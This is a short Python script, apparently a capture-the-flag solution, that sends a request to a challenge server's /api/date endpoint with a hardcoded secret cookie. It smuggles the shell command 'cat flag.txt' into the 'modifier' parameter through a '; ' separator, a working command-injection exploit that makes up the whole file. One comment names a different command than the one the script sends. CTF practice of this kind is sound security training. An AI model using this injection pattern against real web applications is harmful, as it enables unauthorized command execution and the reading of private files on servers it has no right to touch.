import requests

# Replace with the actual secret you obtained
secret = "948159a2b635668905b778606e5b1b0774820a4410d28782be1ad3f341eb4a76"

# URL to the /api/date endpoint
url = "http://not-a-problem.chal.cyberjousting.com/api/date"

# Command to run (ls -al)
command = "cat flag.txt"

# Inject the command via the modifier parameter
params = {
    "modifier": f"; {command}"
}

# Set the secret cookie
cookies = {
    "secret": secret
}

# Send the request
response = requests.get(url, params=params, cookies=cookies)
print(response.text)
